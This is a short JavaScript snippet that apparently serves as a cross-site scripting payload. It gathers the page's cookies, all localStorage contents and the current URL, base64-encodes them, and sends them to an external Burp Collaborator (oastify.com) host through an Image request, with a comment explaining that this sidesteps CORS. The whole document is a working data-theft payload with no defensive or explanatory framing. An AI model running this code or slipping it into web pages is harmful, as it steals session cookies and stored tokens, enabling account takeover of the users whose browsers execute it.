const data = {
  cookie: document.cookie,
  localStorage: JSON.stringify(localStorage),
  url: location.href
};

const encoded = btoa(JSON.stringify(data));

// Leak using Image to avoid CORS error
new Image().src = "https://ebt4xhwz0ffgihdddc7oqtkympsgg84x.oastify.com/leak?" + encoded;
